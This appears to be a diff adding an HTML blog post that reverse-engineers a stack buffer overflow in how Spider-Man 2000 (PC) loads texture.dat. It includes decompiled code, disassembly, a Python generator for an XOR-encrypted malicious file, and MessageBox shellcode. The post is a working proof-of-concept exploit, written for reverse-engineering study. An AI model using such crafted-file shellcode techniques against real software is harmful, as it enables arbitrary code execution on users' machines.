@@ -1,0 +1,217 @@
+<html>
+
+	<head>
+		
+	<link rel="stylesheet" href="../static/borland.css">
+
+		<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.6/build/pure-min.css" integrity="sha384-Uu6IeWbM+gzNVXJcM9XV3SohHtmWE+3VGi496jvgX1jyvDTXfdK+rfZc8C1Aehk5" crossorigin="anonymous">
+		<link rel="stylesheet" href="../static/styles.css" >
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+
+	</head>
+
+
+	<body>
+
+		<header>
+			<div class="nav-holder">
+				<nav class="container">
+				<div class="logo-name">
+					<img class="logo" src="https://krystalgamer.github.io/images/logo.png" alt="krystalgamer's Lair">
+					<a href="../index.html">krystalgamer's Lair</a>
+				</div>
+				<a href="../about/index.html">About</a>
+				</nav>
+			</div>
+
+
+			<div class="header-bg">
+			
+				<h1>
+					krystalgamer - Blog
+				</h1>
+
+			</div>
+		</header>
+		<main class="container dope-shadow">
+
+			
+	<div class="post-holder">
+		<p><h1>Exploiting: Spiderman 2000 - Buffer overflow in file loading routine</h1></p>
+<h1>Background</h1>
+<p>At the end of this year(2019) I decided to completly reverse engineer the game Spider-Man 2000 for the PC in order to be able to fix all of its problems and possibly port it to more architectures and OS(es).
+During my second stream I was working on the routine that loads the file <code>texture.dat</code> and noticed that the buffer not only in allocated in the stack but there's no boundary check.</p>
+<p><code>texture.dat</code> is a file that exists in the game's directory and apparents to be useless since the lack of it doesn't cause any harm to the game or experience.</p>
+<h1>The vulnerability</h1>
+<p><code>sub_5163E0</code> calls <code>sub_516250</code> to load <code>texture.dat</code> and passes a local variable as a buffer.</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">sub_5163E0</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a1</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">	</span><span class="kt">int</span><span class="w"> </span><span class="n">v2</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-224h]</span>
+<span class="w">	</span><span class="kt">int</span><span class="w"> </span><span class="n">Buffer</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+4h] [ebp-220h]</span>
+<span class="w">	</span><span class="kt">char</span><span class="w"> </span><span class="n">v4</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+8h] [ebp-21Ch]</span>
+<span class="w">	</span><span class="kt">char</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+Bh] [ebp-219h]</span>
+<span class="w">	</span><span class="kt">int</span><span class="w"> </span><span class="n">v6</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+24h] [ebp-200h]</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">a1</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">		</span><span class="o">*</span><span class="n">a1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">sub_516250</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="n">aTextureDat</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="p">(...)</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>As can be seen below, this buffer only has <code>0x220</code> bytes.</p>
+<div class="highlight"><pre><span></span><span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"> </span><span class="no">Buffer</span><span class="w">          </span><span class="err">=</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="mi">-220</span><span class="no">h</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"> </span><span class="no">var_21C</span><span class="w">         </span><span class="err">=</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="mi">-21</span><span class="no">Ch</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"> </span><span class="no">var_219</span><span class="w">         </span><span class="err">=</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="mi">-219</span><span class="no">h</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"> </span><span class="no">var_200</span><span class="w">         </span><span class="err">=</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="mi">-200</span><span class="no">h</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"> </span><span class="no">arg_0</span><span class="w">           </span><span class="err">=</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w">  </span><span class="mi">4</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E0</span><span class="w">                 </span><span class="no">sub</span><span class="w">     </span><span class="no">esp</span><span class="p">,</span><span class="w"> </span><span class="mi">220</span><span class="no">h</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E6</span><span class="w">                 </span><span class="no">push</span><span class="w">    </span><span class="no">esi</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">E7</span><span class="w">                 </span><span class="no">mov</span><span class="w">     </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">224</span><span class="no">h</span><span class="err">+</span><span class="no">arg_0</span><span class="p">]</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">EE</span><span class="w">                 </span><span class="no">test</span><span class="w">    </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F0</span><span class="w">                 </span><span class="no">jz</span><span class="w">      </span><span class="no">short</span><span class="w"> </span><span class="no">loc_5163F5</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F2</span><span class="w">                 </span><span class="no">mov</span><span class="w">     </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">esi</span><span class="p">],</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F5</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F5</span><span class="w"> </span><span class="no">loc_5163F5</span><span class="p">:</span><span class="w">                             </span><span class="c1">; CODE XREF: sub_5163E0+10?j</span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F5</span><span class="w">                 </span><span class="no">lea</span><span class="w">     </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">224</span><span class="no">h</span><span class="err">+</span><span class="no">Buffer</span><span class="p">]</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">F9</span><span class="w">                 </span><span class="no">push</span><span class="w">    </span><span class="no">offset</span><span class="w"> </span><span class="no">aTextureDat</span><span class="w"> </span><span class="c1">; &quot;texture.dat&quot;</span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">FE</span><span class="w">                 </span><span class="no">push</span><span class="w">    </span><span class="no">eax</span><span class="w">             </span><span class="c1">; lpBuffer</span>
+<span class="nl">.text:</span><span class="err">005163</span><span class="nf">FF</span><span class="w">                 </span><span class="no">call</span><span class="w">    </span><span class="no">sub_516250</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">00516404</span><span class="w">                 </span><span class="nf">add</span><span class="w">     </span><span class="no">esp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">00516407</span><span class="w">                 </span><span class="nf">test</span><span class="w">    </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="no">eax</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">00516409</span><span class="w">                 </span><span class="nf">jnz</span><span class="w">     </span><span class="no">short</span><span class="w"> </span><span class="no">loc_516415</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">0051640</span><span class="nf">B</span><span class="w">                 </span><span class="no">mov</span><span class="w">     </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">0051640</span><span class="nf">D</span><span class="w">                 </span><span class="no">pop</span><span class="w">     </span><span class="no">esi</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">0051640</span><span class="nf">E</span><span class="w">                 </span><span class="no">add</span><span class="w">     </span><span class="no">esp</span><span class="p">,</span><span class="w"> </span><span class="mi">220</span><span class="no">h</span><span class="w"></span>
+<span class="nl">.text:</span><span class="err">00516414</span><span class="w">                 </span><span class="nf">retn</span><span class="w"></span>
+</pre></div>
+<p>Here's the relevant part of the loading:</p>
+<div class="highlight"><pre><span></span><span class="n">LPVOID</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">sub_516250</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpBuffer</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a2</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">	</span><span class="p">(...)</span><span class="w"></span>
+<span class="w">	</span><span class="n">v9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">Filename</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80000000</span><span class="p">,</span><span class="w"> </span><span class="mi">1u</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">3u</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">	</span><span class="n">v10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v9</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v9</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mi">-1</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="n">v11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetFileSize</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">	</span><span class="n">v12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v11</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span>
+<span class="w">	</span><span class="c1">//The only check it does is wether the number doesn&#39;t have the last 2 bits set and if it&#39;s bigger than 4</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v11</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">v11</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">	</span><span class="p">{</span><span class="w"></span>
+<span class="w">		</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span><span class="w"></span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="p">}</span><span class="w"></span>
+<span class="w">	</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span><span class="w"> </span><span class="n">lpBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">v11</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">NumberOfBytesRead</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">	</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span><span class="w"></span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">NumberOfBytesRead</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">v12</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">lpBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v12</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">	</span><span class="c1">//Returns an array of size 0x190 that contains the decryption key</span>
+<span class="w">	</span><span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sub_4FC230</span><span class="p">();</span><span class="w"></span>
+
+<span class="w">	</span><span class="n">v14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v12</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"></span>
+<span class="w">	</span><span class="n">v15</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">	</span><span class="c1">//Decrypts texture.dat</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v14</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">	</span><span class="p">{</span><span class="w"></span>
+<span class="w">		</span><span class="k">do</span><span class="w"></span>
+<span class="w">		</span><span class="p">{</span><span class="w"></span>
+<span class="w">			</span><span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">lpBuffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">v15</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">v13</span><span class="p">[</span><span class="n">v15</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mh">0x190</span><span class="p">];</span><span class="w"></span>
+<span class="w">			</span><span class="o">++</span><span class="n">v15</span><span class="p">;</span><span class="w"></span>
+<span class="w">		</span><span class="p">}</span><span class="w"></span>
+<span class="w">		</span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v15</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">v14</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
+<span class="w">	</span><span class="p">}</span><span class="w"></span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="n">lpBuffer</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>Having a <code>texture.dat</code> of size <code>0x224</code> is enough to trigger the vulnerability.</p>
+<h1>Exploiting</h1>
+<p><em>NOTE: All the code for the generator is available in my <code>spidey-tools</code> repository.</em></p>
+<p>Out of the <code>0x224</code> bytes the first 4 are dedicated to the file size and last 4 to the jump address. So that results in <code>0x21C</code> for the shellcode which is more than enough for a simple PoC.</p>
+<h2>texture.dat generator</h2>
+<p>The script creates a list that latter is converted to a <code>bytearray</code> and then dumped to disk.</p>
+<p>The way the list is generated is as follows:</p>
+<ul>
+<li>Creates 4 dummy bytes</li>
+<li>Adds the shellcode</li>
+<li>Adds the string &quot;*Game has been pwned&quot;:</li>
+<li>Adds dummy bytes until <code>0x220</code> is reached</li>
+<li>Adds the jump address</li>
+</ul>
+<p>Finally it is encrypted(XOR is symmetric) and then dumped to disk.</p>
+<p>Code:</p>
+<div class="highlight"><pre><span></span><span class="n">byt</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;xor_key.bin&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">final</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00\x00\x00\x00\x6A\x00\x6A\x00\x68</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">final</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">final</span><span class="p">]</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x26</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xFC</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x6A</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">final</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">final</span><span class="p">]</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xB8</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xC8</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x59</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xE0</span><span class="p">)</span>
+
+<span class="n">pwn_str</span> <span class="o">=</span> <span class="s2">&quot;Game has been pwnd</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">pwn_str</span><span class="p">:</span>
+    <span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">final</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x220</span><span class="p">:</span>
+    <span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>
+
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x14</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xFC</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)</span>
+<span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>
+
+<span class="n">final</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">final</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">index</span><span class="p">,</span><span class="n">_</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">final</span><span class="p">[</span><span class="mi">4</span><span class="p">:]):</span>
+    <span class="n">final</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="n">index</span><span class="p">]</span> <span class="o">^=</span> <span class="n">byt</span><span class="p">[</span><span class="n">index</span><span class="o">%</span><span class="mh">0x190</span><span class="p">]</span>
+
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;texture.dat&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">final</span><span class="p">)</span>
+</pre></div>
+<p>The string with the hex characters - <code>\x00</code> - must respect the utf-8 encoding. That caused lots of problems, that the string <code>\xB8</code> would be converted to <code>\xC2\xB8</code>, that is why I split the logic.</p>
+<h2>Shellcode</h2>
+<p>Since this exploit has a lack usefulness I decided to keep it simple and just spawn a <code>MessageBox</code>.
+Here's the full shellcode:</p>
+<div class="highlight"><pre><span></span><span class="err">6</span><span class="nf">A</span><span class="w"> </span><span class="mi">00</span><span class="w">        </span><span class="err">|</span><span class="w"> </span><span class="no">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                     </span><span class="err">|</span><span class="w"></span>
+<span class="err">6</span><span class="nf">A</span><span class="w"> </span><span class="mi">00</span><span class="w">        </span><span class="err">|</span><span class="w"> </span><span class="no">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                     </span><span class="err">|</span><span class="w"></span>
+<span class="err">68</span><span class="w"> </span><span class="err">26</span><span class="nf">FC1900</span><span class="w">  </span><span class="err">|</span><span class="w"> </span><span class="no">push</span><span class="w"> </span><span class="mi">19</span><span class="no">FC26</span><span class="w">                </span><span class="err">|</span><span class="w"> </span><span class="mi">19</span><span class="no">FC26</span><span class="p">:</span><span class="err">&quot;</span><span class="no">Game</span><span class="w"> </span><span class="no">has</span><span class="w"> </span><span class="no">been</span><span class="w"> </span><span class="no">pwnd</span><span class="err">&quot;</span><span class="w"></span>
+<span class="err">6</span><span class="nf">A</span><span class="w"> </span><span class="mi">00</span><span class="w">        </span><span class="err">|</span><span class="w"> </span><span class="no">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                     </span><span class="err">|</span><span class="w"></span>
+<span class="nf">B8</span><span class="w"> </span><span class="no">C8595100</span><span class="w">  </span><span class="err">|</span><span class="w"> </span><span class="no">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="no">spideypc.5159C8</span><span class="w">    </span><span class="err">|</span><span class="w"></span>
+<span class="nf">FFE0</span><span class="w">         </span><span class="err">|</span><span class="w"> </span><span class="no">jmp</span><span class="w"> </span><span class="no">eax</span><span class="w">                    </span><span class="err">|</span><span class="w"></span>
+</pre></div>
+<p>The address <code>spideypc.5159C8</code> contains a call to <code>MessageBoxA</code> followed by a <code>_exit(1)</code> which was perfect for this case.</p>
+<h2>Result</h2>
+<p><img src="../static/images/spidey/buffer_overflow.png" alt="result of buffer overflow " /></p>
+<h2>Video of process</h2>
+<p>If you're interested in seeing how this process unfolded then you can watch the two VODs.</p>
+<p>Here I stumbled upon the problem but don't go super deep:</p>
+<p><div class="youtube-container"><iframe src="https://www.youtube.com/embed/ZN365iN7myM" frameborder="0" allowfullscreen class="youtube-video"></iframe></div></p>
+<p>Stream dedicated to developing the exploit:</p>
+<p><div class="youtube-container"><iframe src="https://www.youtube.com/embed/a6A6XOOhJ2g" frameborder="0" allowfullscreen class="youtube-video"></iframe></div></p>
+
+	</div>
+
+
+		</main>
+
+		<footer class="container">
+			© 2022 krystalgamer
+		</footer>
+	</body>
+
+</html>
